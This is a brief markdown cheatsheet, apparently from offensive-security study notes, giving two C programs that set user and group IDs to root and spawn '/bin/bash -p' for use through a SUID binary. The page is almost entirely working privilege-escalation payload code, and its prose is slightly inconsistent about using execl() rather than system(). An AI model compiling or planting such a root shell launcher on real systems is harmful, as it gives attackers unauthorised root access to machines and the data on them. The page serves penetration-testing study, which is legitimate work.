# Minimal SUID Shell Launcher

```c
#include <stdio.h>
#include <unistd.h>

main() {
	setuid(0);
	setgid(0);
	execl("/bin/bash",
	      "/bin/bash",
	      "-p",
	      (char*) NULL);
}
```

Alternate approach:

```c
#include <stdio.h>
#include <time.h>

main() {
	setresuid(0, 0, 0);
	setregid(0, 0, 0);
	system("/bin/bash -p");
	return 0;
}
```

Once compiled, this needs to be called by an SUID binary. The `-p` is required to keep bash from dropping privileges.

Note that this is very similar to the `LD_PRELOAD` trick, except that we're using `execl()` instead of `system()` and dropping a header.

* [slyth11907 / Cheatsheets](https://github.com/slyth11907/Cheatsheets)
* [unistd's execl() without passing any arguments](https://stackoverflow.com/a/34400649)
* [Exploiting Bash](./Exploiting%20Bash.md)
* [Exploiting LD_PRELOAD](./Exploiting%20LD_PRELOAD.md)
* [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
